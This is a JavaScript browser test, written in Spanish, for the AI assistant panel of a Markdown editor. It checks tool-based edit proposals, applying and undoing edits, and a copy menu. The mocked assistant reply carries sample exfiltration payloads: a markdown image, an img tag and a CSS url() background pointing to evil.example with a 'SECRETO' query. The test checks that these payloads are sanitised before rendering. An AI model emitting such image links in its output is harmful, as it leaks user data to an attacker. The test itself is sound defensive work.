// =============================================================================
// dbv-md-reader — Lector y editor nativo de Markdown (.md) para Windows, Linux y macOS
// Copyright (c) 2026 David Bueno Vallejo
// Licensed under the MIT License. See LICENSE for details.
// Built with dbv-specs-ops · https://github.com/davidbuenov/dbv-specs-ops
// =============================================================================
//
// Asistente: conversación con herramientas, revisión, aplicar en el editor y Ctrl+Z (RF-33, RF-34, RNF-IA.7).
//
// @spec RF-33
// @spec RF-34
// @spec RNF-IA.7
// =============================================================================

import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { tmpdir } from 'node:os';
import { findEdge, launch } from './harness.mjs';

if (!findEdge()) {
  console.log('Sin Edge/Chromium: se omite este banco (define EDGE_PATH para indicarlo).');
  process.exit(0);
}


const OUT = tmpdir();
const appDir = path.join(path.dirname(path.dirname(path.dirname(fileURLToPath(import.meta.url)))), 'src').replace(/\\/g, '/');
const doc = ['# Título', '', 'Párrafo con un erorr de ortografia.', '', '## Sección', '', 'Más texto aquí.', ''].join('\n');

const extra = JSON.stringify({
  ai_connections: { connections: [{ id: 'c1', name: 'Ollama · qwen2.5:3b', provider: 'ollama', baseUrl: 'http://localhost:11434', model: 'qwen2.5:3b', hasKey: false, contextTokens: 8192, supportsTools: true, supportsImages: false }], active: 'c1', showAi: true },
  ai_providers: [{ provider: 'ollama', baseUrl: 'http://localhost:11434', cloud: false, contextTokens: 8192, maxOutputTokens: 4096 }],
  ai_model_info: null,
  ai_list_files: ['test.md', 'otro.md'],
  ai_project_state_load: null,
  ai_project_state_save: null,
  ai_check_proposal: { diagnostics: [] },
});

// El modelo: 1.ª llamada → propone un cambio con la herramienta; 2.ª → texto final.
const customInvoke = `((cmd, args) => {
  if (cmd !== 'ai_chat') return undefined;
  window.__chat.push(args);
  const n = window.__chat.length;
  const toolCall = { type: 'toolCall', id: 't1', name: 'propose_changes', arguments: JSON.stringify({ summary: 'Corrige la ortografía', changes: [{ path: 'test.md', action: 'edit', search: 'un erorr de ortografia', replace: 'un error de ortografía' }] }) };
  const script = n === 1
    ? [toolCall, { type: 'usage', input: 100, output: 20, evalMs: 0 }, { type: 'done', stopReason: 'tool_use' }]
    : [{ type: 'text', text: 'He corregido la errata del párrafo. ![x](https://evil.example/a.png?q=SECRETO) <img src="https://evil.example/b.png"> <div style="background:url(https://evil.example/c.png)">hola</div> ![ok](data:image/png;base64,iVBORw0KGgo=)' }, { type: 'usage', input: 150, output: 12, evalMs: 0 }, { type: 'done', stopReason: 'end_turn' }];
  script.forEach((ev, i) => setTimeout(() => window.__emit('ai-stream', { requestId: args.requestId, ...ev }), 15 + i * 8));
  return null;
})`;

const h = await launch({ appDir, docPath: 'C:/x/test.md', docContent: doc, extraInvoke: extra, customInvoke });
let failed = 0;
const ok = (name, cond, detail = '') => { console.log(`${cond ? '  ok ' : '  FALLA'} ${name}${detail ? ' — ' + detail : ''}`); if (!cond) failed++; };

try {
  // ── Con una conexión guardada: el botón abre el Asistente (no el asistente de conexión) ──
  await h.eval(`document.getElementById('btn-ai').click()`);
  await h.sleep(1500);
  const panel = await h.eval(`
    const sb = document.getElementById('toc-sidebar');
    return {
      sidebarVisible: !sb.classList.contains('hidden'),
      width: Math.round(sb.getBoundingClientRect().width),
      tabActive: document.getElementById('tab-ai').classList.contains('active'),
      panelVisible: !document.getElementById('ai-panel').classList.contains('hidden'),
      tocHidden: document.getElementById('toc-panel').classList.contains('hidden'),
      title: document.querySelector('.ai-panel__title')?.textContent,
      dest: document.querySelector('.ai-panel__destination')?.textContent,
      chips: [...document.querySelectorAll('.ai-panel__context .ai-chip')].map(c => c.textContent.replace('×','').trim()),
      suggestions: document.querySelectorAll('.ai-panel__suggestion').length,
      connectOpen: !document.getElementById('ai-connect-modal').classList.contains('hidden'),
      placeholder: document.querySelector('.ai-panel__input')?.placeholder,
    }`);
  ok('con IA conectada, el botón abre el Asistente (no el modal)', panel.panelVisible && !panel.connectOpen);
  ok('es la tercera pestaña del panel lateral, que se ensancha', panel.tabActive && panel.sidebarVisible && panel.tocHidden && panel.width >= 360, `ancho ${panel.width}px`);
  ok('cabecera «Asistente» y destino local', panel.title === 'Asistente' && /Local/.test(panel.dest), `${panel.title} | ${panel.dest}`);
  ok('el contexto incluye el documento abierto', panel.chips.some((c) => /test\.md/.test(c)), JSON.stringify(panel.chips));
  ok('sugerencias iniciales para un documento Markdown', panel.suggestions === 3);
  ok('placeholder igual que el de la captura de typst, adaptado', /Ask something about your document|Pide algo sobre tu documento/.test(panel.placeholder));
  await h.screenshot(OUT + '/ai-panel.png');

  // ── Conversación: el modelo propone un cambio con la herramienta ───────────
  await h.eval(`const i=document.querySelector('.ai-panel__input'); i.value='Corrige la ortografía'; i.dispatchEvent(new Event('input',{bubbles:true}));`);
  await h.key('Enter', 'Enter', 13);
  await h.sleep(1500);
  const conv = await h.eval(`
    return {
      user: document.querySelector('.ai-msg--user')?.textContent,
      steps: [...document.querySelectorAll('.ai-step')].map(e => e.textContent),
      assistant: [...document.querySelectorAll('.ai-msg--assistant')].map(e => e.textContent.trim()).join(' | '),
      review: !!document.querySelector('.ai-review'),
      summary: document.querySelector('.ai-review__summary')?.textContent,
      status: document.querySelector('.ai-review__status')?.textContent,
      stats: document.querySelector('.ai-file__stats')?.textContent,
      file: document.querySelector('.ai-file__path')?.textContent,
      chatCalls: window.__chat.length,
      toolsOffered: (window.__chat[0].request.tools || []).map(t => t.name),
      sys: (window.__chat[0].request.messages[0].content || '').slice(0, 90),
      ctxHasDoc: window.__chat[0].request.messages.some(m => /Open document: test\\.md/.test(m.content)),
    }`);
  ok('el mensaje del usuario aparece', conv.user === 'Corrige la ortografía');
  ok('el modelo recibe las 5 herramientas de md-reader (y ninguna de Typst)', JSON.stringify(conv.toolsOffered.sort()) === JSON.stringify(['get_outline', 'list_files', 'propose_changes', 'read_file', 'search_files']), JSON.stringify(conv.toolsOffered));
  ok('el prompt de sistema habla de Markdown y de DBV Markdown Reader', /DBV Markdown Reader/.test(conv.sys), conv.sys);
  ok('el documento abierto va en el contexto', conv.ctxHasDoc);
  ok('se ve el paso «Preparando cambios en test.md»', conv.steps.some((s) => /test\.md/.test(s)), JSON.stringify(conv.steps));
  ok('aparece la tarjeta de revisión con el resumen y el fichero', conv.review && conv.summary === 'Corrige la ortografía' && conv.file === 'test.md', `${conv.summary} / ${conv.file} / ${conv.stats}`);
  ok('la comprobación dice «sin errores nuevos»', /Sin errores nuevos/.test(conv.status), conv.status);
  ok('hubo 2 llamadas al modelo (propuesta + respuesta final)', conv.chatCalls === 2, String(conv.chatCalls));
  ok('la respuesta final del asistente se muestra', /He corregido/.test(conv.assistant));

  // ── Copiar con el botón derecho (el menú nativo está tapado en toda la app) ─────────────────────
  const copyMenu = await h.eval(`
    window.__copied = []; navigator.clipboard.writeText = (t) => { window.__copied.push(t); return Promise.resolve(); };
    const bubble = [...document.querySelectorAll('.ai-msg--assistant')].pop();
    const range = document.createRange(); range.selectNodeContents(bubble.querySelector('p') || bubble);
    const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
    const ev = new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: 900, clientY: 300 });
    bubble.dispatchEvent(ev);
    const items = [...document.querySelectorAll('.ctx-menu .ctx-item')].map((b) => b.dataset.action);
    document.querySelector('.ctx-menu [data-action="copyMessage"]')?.click();
    await new Promise((r) => setTimeout(r, 100));
    return { prevented: ev.defaultPrevented, items, copied: window.__copied };`);
  ok('clic derecho en un mensaje del asistente abre un menú propio con Copiar y Copiar mensaje', copyMenu.prevented && copyMenu.items.includes('copy') && copyMenu.items.includes('copyMessage'), JSON.stringify(copyMenu.items));
  ok('«Copiar mensaje» copia el texto del mensaje', copyMenu.copied.length === 1 && /He corregido/.test(copyMenu.copied[0]), JSON.stringify(copyMenu.copied));
  const copySel = await h.eval(`
    const bubble = [...document.querySelectorAll('.ai-msg--assistant')].pop();
    const range = document.createRange(); range.selectNodeContents(bubble.querySelector('p') || bubble);
    const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
    bubble.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: 900, clientY: 300 }));
    window.__copied.length = 0;
    document.querySelector('.ctx-menu [data-action="copy"]')?.click();
    await new Promise((r) => setTimeout(r, 100));
    return window.__copied;`);
  ok('«Copiar» copia justo la selección', copySel.length === 1 && /He corregido/.test(copySel[0]), JSON.stringify(copySel));
  const nativeInput = await h.eval(`const i = document.querySelector('.ai-panel__input'); const ev = new MouseEvent('contextmenu', { bubbles: true, cancelable: true }); i.dispatchEvent(ev); return ev.defaultPrevented;`);
  ok('el cuadro de escribir conserva su menú nativo (cortar/pegar)', nativeInput === false);
  await h.eval(`document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));`);

  // ── Exfiltración por imagen markdown: la salida de la IA no carga medios remotos ──
  const leak = await h.eval(`
    const bubble = [...document.querySelectorAll('.ai-msg--assistant')].pop();
    return {
      remoteImgs: [...bubble.querySelectorAll('img')].map(i => i.getAttribute('src')).filter(s => !/^data:image\\//.test(s || '')),
      dataImgs: [...bubble.querySelectorAll('img')].filter(i => /^data:image\\//.test(i.getAttribute('src') || '')).length,
      urlStyles: [...bubble.querySelectorAll('[style]')].filter(e => /url\\(/i.test(e.getAttribute('style'))).length,
      blocked: bubble.querySelectorAll('.ai-blocked').length,
      html: bubble.innerHTML.includes('evil.example') ? bubble.innerHTML.match(/.{0,40}evil\\.example.{0,40}/g) : [],
    }`);
  ok('la salida de la IA no contiene imágenes ni estilos con url() (se sanea ANTES de crear el DOM)', leak.remoteImgs.length === 0 && leak.dataImgs === 0 && leak.urlStyles === 0 && leak.html.length === 0, JSON.stringify(leak));
  const requested = await h.eval(`return performance.getEntriesByType('resource').map(r => r.name).filter(n => n.includes('evil.example'))`);
  ok('y el navegador no llegó a pedir ninguna dirección del atacante', requested.length === 0, JSON.stringify(requested));

  // ── Aplicar: va al editor, queda «Modificado», es deshacible y NO se escribe en disco ──
  await h.eval(`document.querySelector('.ai-review__actions .button--primary').click()`);
  await h.sleep(800);
  const applied = await h.eval(`
    const t = document.getElementById('editor-textarea');
    return {
      edit: document.getElementById('reader-container').classList.contains('edit-mode'),
      fixed: t.value.includes('un error de ortografía'),
      modified: !document.getElementById('doc-modified-badge')?.classList.contains('hidden') && !!document.getElementById('doc-modified-badge'),
      badgeText: document.getElementById('doc-modified-badge')?.textContent,
      report: document.querySelector('.ai-review__report')?.textContent,
      writes: window.__calls.filter(c => c[0] === 'write_file' || c[0] === 'ai_write_file').length,
    }`);
  ok('aplicar entra en Modo Edición y corrige el texto del editor', applied.edit && applied.fixed);
  ok('el documento queda «Modificado» (el usuario guarda con Ctrl+S)', applied.modified, applied.badgeText);
  ok('NADA se escribió en disco por detrás del editor (RNF-IA.7)', applied.writes === 0, `escrituras: ${applied.writes}`);
  ok('el informe avisa de que hay que guardar', /Ctrl\+S/.test(applied.report || ''), applied.report);
  await h.eval(`document.getElementById('editor-textarea').focus();`);
  await h.key('z', 'KeyZ', 90, 2); // Ctrl+Z
  await h.sleep(400);
  const undone = await h.eval(`const t=document.getElementById('editor-textarea'); return t.value.includes('un erorr de ortografia')`);
  ok('Ctrl+Z deshace el cambio de la IA (edición nativa del textarea)', undone);

  await h.screenshot(OUT + '/ai-panel-2.png');
  const errs = h.errors();
  ok('sin excepciones ni console.error', errs.length === 0, JSON.stringify(errs.slice(0, 4)));
} catch (e) {
  console.error('EXCEPCIÓN DEL BANCO:', e.message);
  failed++;
} finally {
  await h.close();
}
console.log(failed ? `\n${failed} fallos` : '\nTodo correcto');
process.exit(failed ? 1 : 0);
